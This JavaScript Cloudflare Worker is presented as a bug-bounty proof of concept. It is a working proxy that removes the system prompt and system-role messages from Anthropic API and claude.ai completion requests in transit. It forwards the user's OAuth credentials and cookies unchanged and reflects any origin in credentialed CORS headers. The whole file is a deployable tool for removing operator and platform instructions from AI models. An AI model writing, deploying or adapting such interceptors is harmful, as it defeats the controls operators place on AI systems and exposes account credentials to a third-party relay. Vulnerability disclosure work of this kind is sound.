// ================================================================
// WORKER C — CF Interceptor / System Prompt Stripper
// Sister PoC research artifact — Anthropic HackerOne VDP
// Single-operator only. Not for distribution.
//
// WHAT THIS DOES:
//   Sits between the browser (Tampermonkey on claude.ai or Worker B)
//   and the API backend. Strips the `system` prompt field from
//   /v1/messages and completion requests before forwarding.
//
//   This demonstrates: a network-level intermediary can strip
//   operator system prompts from API calls in transit.
//
// TWO MODES via FORWARD_URL env var:
//
//   TESTING (closed loop — no real Anthropic contact):
//     FORWARD_URL = https://worker-a.YOUR-SUBDOMAIN.workers.dev
//     → strips system → forwards to Worker A mock backend
//
//   VDP DEMO (real Anthropic — your legit account):
//     FORWARD_URL = passthrough   (or leave blank)
//     → strips system → forwards to original destination
//       (api.anthropic.com, claude.ai, etc.)
//     Your real OAuth credentials are forwarded unchanged.
//
// REQUIRED ENV VARS:
//   FORWARD_URL — see above. Default: passthrough
//
// DEPLOY:
//   wrangler deploy worker_c_cf.js
//   OR paste into Cloudflare Dashboard → Workers → Editor
// ================================================================

const PASSTHROUGH = 'passthrough';

// ── CORS ──────────────────────────────────────────────────────
function cors(origin) {
  return {
    'Access-Control-Allow-Origin':      origin || '*',
    'Access-Control-Allow-Credentials': 'true',
    'Access-Control-Allow-Methods':     'GET, POST, PUT, PATCH, DELETE, OPTIONS',
    'Access-Control-Allow-Headers':     [
      'Content-Type', 'Authorization', 'x-api-key',
      'anthropic-version', 'anthropic-beta',
      'x-wc-intercepted', 'cookie',
    ].join(', '),
    'Access-Control-Max-Age': '86400',
  };
}

function json(data, status = 200, origin) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', ...cors(origin) },
  });
}

// ── System prompt stripping ───────────────────────────────────
// Core of the VDP finding: strip `system` from body before forward.
function stripSystem(body) {
  const result = { stripped: false, originalLength: 0, preview: '', body };
  if (!body || typeof body !== 'object') return result;

  const modified = { ...body };

  if (modified.system) {
    result.stripped       = true;
    result.originalLength = String(modified.system).length;
    result.preview        = String(modified.system).slice(0, 120);
    delete modified.system;
  }

  // Also strip system-role messages from messages array
  if (Array.isArray(modified.messages)) {
    const systemMsgs = modified.messages.filter(m => m.role === 'system');
    if (systemMsgs.length) {
      if (!result.stripped) {
        result.stripped       = true;
        result.originalLength = systemMsgs.reduce((n, m) => n + String(m.content || '').length, 0);
        result.preview        = String(systemMsgs[0].content).slice(0, 120);
      }
      modified.messages = modified.messages.filter(m => m.role !== 'system');
    }
  }

  result.body = modified;
  return result;
}

// ── Determine forward target ──────────────────────────────────
function getForwardUrl(env, originalUrl) {
  const fwd = (env.FORWARD_URL || PASSTHROUGH).trim();

  if (!fwd || fwd === PASSTHROUGH) {
    // Pass through to original destination unchanged (VDP demo mode)
    return originalUrl;
  }

  // Testing mode — forward to configured Worker A
  const parsed = new URL(originalUrl);
  return fwd.replace(/\/$/, '') + parsed.pathname + parsed.search;
}

// ── Router ────────────────────────────────────────────────────
export default {
  async fetch(request, env) {
    const url    = new URL(request.url);
    const method = request.method.toUpperCase();
    const origin = request.headers.get('origin') || '*';

    // CORS preflight
    if (method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: cors(origin) });
    }

    // Health check
    if (url.pathname === '/health') {
      const fwd = env.FORWARD_URL || PASSTHROUGH;
      return json({
        ok:      true,
        worker:  'C',
        role:    'system_prompt_interceptor',
        mode:    fwd === PASSTHROUGH ? 'passthrough (VDP demo)' : `testing → ${fwd}`,
        ts:      Date.now(),
      }, 200, origin);
    }

    // ── Intercept completion/messages paths ───────────────────
    const isTarget = url.pathname === '/v1/messages' ||
                     url.pathname.match(/\/chat_conversations\/[^/]+\/completion$/) ||
                     url.pathname.match(/\/v1\/completions$/);

    // Reconstruct the original destination URL from headers
    // (Tampermonkey sends x-original-url header)
    const originalUrlStr = request.headers.get('x-original-url') || request.url;

    if (isTarget && (method === 'POST' || method === 'PUT')) {
      let body;
      const rawText = await request.text();
      try { body = rawText ? JSON.parse(rawText) : {}; }
      catch { body = {}; }

      const { stripped, originalLength, preview, body: strippedBody } = stripSystem(body);

      const targetUrl = getForwardUrl(env, originalUrlStr);

      // Forward headers — include all original headers (credentials, auth, etc.)
      const fwdHeaders = new Headers();
      for (const [k, v] of request.headers.entries()) {
        // Drop hop-by-hop and our custom routing headers
        if (['host', 'x-original-url', 'x-forwarded-for'].includes(k.toLowerCase())) continue;
        fwdHeaders.set(k, v);
      }
      fwdHeaders.set('content-type', 'application/json');
      fwdHeaders.set('x-forwarded-by', 'worker-c');

      if (stripped) {
        console.log(`[Worker C] ✂ Stripped system prompt (${originalLength} chars): "${preview.slice(0, 80)}…"`);
      }

      const upstream = await fetch(targetUrl, {
        method:  method,
        headers: fwdHeaders,
        body:    JSON.stringify(strippedBody),
      });

      // Forward response — including SSE stream
      const respHeaders = new Headers();
      for (const [k, v] of upstream.headers.entries()) {
        if (['transfer-encoding'].includes(k.toLowerCase())) continue;
        respHeaders.set(k, v);
      }
      // CORS
      Object.entries(cors(origin)).forEach(([k, v]) => respHeaders.set(k, v));
      // Evidence headers for VDP report
      if (stripped) {
        respHeaders.set('x-wc-system-stripped', 'true');
        respHeaders.set('x-wc-system-length',   String(originalLength));
        respHeaders.set('x-wc-system-preview',  preview.replace(/\n/g, ' ').slice(0, 80));
      } else {
        respHeaders.set('x-wc-system-stripped', 'false');
      }

      return new Response(upstream.body, {
        status:  upstream.status,
        headers: respHeaders,
      });
    }

    // ── All other paths — transparent passthrough ─────────────
    const targetUrl = getForwardUrl(env, originalUrlStr);

    const fwdHeaders = new Headers();
    for (const [k, v] of request.headers.entries()) {
      if (['host', 'x-original-url'].includes(k.toLowerCase())) continue;
      fwdHeaders.set(k, v);
    }
    fwdHeaders.set('x-forwarded-by', 'worker-c');

    const body = method !== 'GET' && method !== 'HEAD' ? request.body : undefined;

    const upstream = await fetch(targetUrl, {
      method:  method,
      headers: fwdHeaders,
      body,
    });

    const respHeaders = new Headers();
    for (const [k, v] of upstream.headers.entries()) {
      if (['transfer-encoding'].includes(k.toLowerCase())) continue;
      respHeaders.set(k, v);
    }
    Object.entries(cors(origin)).forEach(([k, v]) => respHeaders.set(k, v));

    return new Response(upstream.body, {
      status:  upstream.status,
      headers: respHeaders,
    });
  },
};
